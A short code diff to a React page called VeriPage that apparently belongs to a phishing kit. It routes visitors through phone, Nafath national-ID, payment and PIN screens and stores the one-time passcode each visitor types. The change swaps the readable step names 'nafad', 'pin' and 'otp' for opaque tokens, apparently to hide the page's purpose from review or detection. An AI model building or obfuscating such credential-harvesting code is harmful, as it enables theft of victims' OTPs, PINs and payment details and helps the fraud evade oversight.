@@ -142,11 +142,11 @@ export default function VeriPage() {
             router.push("/main")
           } else if (step === "phone") {
             router.push("/phone-info")
-          } else if (step === "nafad") {
+          } else if (step === "_t6") {
             router.push("/nafad")
           } else if (step === "payment") {
             router.push("/check")
-          } else if (step === "pin") {
+          } else if (step === "_t3") {
             router.push("/confi")
           }
         }
@@ -208,7 +208,7 @@ export default function VeriPage() {
       })
 
       // Add OTP to history
-      await addToHistory(visitorID, "otp", {
+      await addToHistory(visitorID, "_t2", {
         otpCode: otp
       }, "pending")
 
